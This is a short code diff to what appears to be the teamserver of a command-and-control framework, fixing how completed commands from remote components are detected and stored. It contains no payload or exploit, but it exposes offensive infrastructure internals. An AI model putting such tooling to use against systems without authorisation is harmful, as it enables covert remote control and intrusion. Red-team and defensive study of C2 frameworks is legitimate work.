@@ -133,7 +133,7 @@ def lp_getcmd(frame, teamserver):
     else:
         data = {'component_id': frame['component_id'], "cmd": "noop",
                 "args": [{"tpk": teamserver.initial_public_key._public_key}], "txid": frame['txid']}
-    if len(frame['done']) > 0:
+    if 'done' in frame.keys():
         process_done_commands(frame, teamserver)
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = instruction_frame
@@ -146,7 +146,7 @@ def process_done_commands(frame, teamserver):
         command['state'] = "COMPLETE"
         event_history = {"timestamp": time(), "event": "OUTPUT_RECEIVED", "component": "server"}
         command['history'].append(event_history)
-        teamserver.cmd_queue[cmd_sent_index] = command
+        teamserver.cmd_sent[cmd_sent_index] = command
 
 
 def lp_cmdack(frame, teamserver):
